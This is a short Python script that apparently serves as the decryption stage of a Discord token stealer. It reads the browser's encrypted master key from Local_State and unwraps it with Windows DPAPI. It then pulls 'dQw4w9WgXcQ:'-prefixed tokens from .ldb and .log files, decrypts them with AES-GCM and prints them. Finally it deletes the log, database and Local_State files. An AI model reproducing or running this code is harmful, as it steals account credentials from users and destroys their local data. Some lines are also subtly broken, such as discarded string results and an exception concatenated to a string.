from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from regex import findall
import os
tokens = []
cleaned = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occured.\n" + e
def main():
    with open(f"Local_State", "r") as file:
        key = loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    for subdir, dirs, files in os.walk('./'):
     for file in files:
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        else:
            try:
                with open(f"{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError:
                continue
    for i in tokens:
        if i.endswith("\\"):
            i.replace("\\", "")
        elif i not in cleaned:
            cleaned.append(i)
    for token in cleaned:
        print(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))#
    for subdir, dirs, files in os.walk('./'):

        for file in files:
            if ".log" in file or ".ldb" in file or "Local_State" in file:
                os.remove(file)
    input()
main()
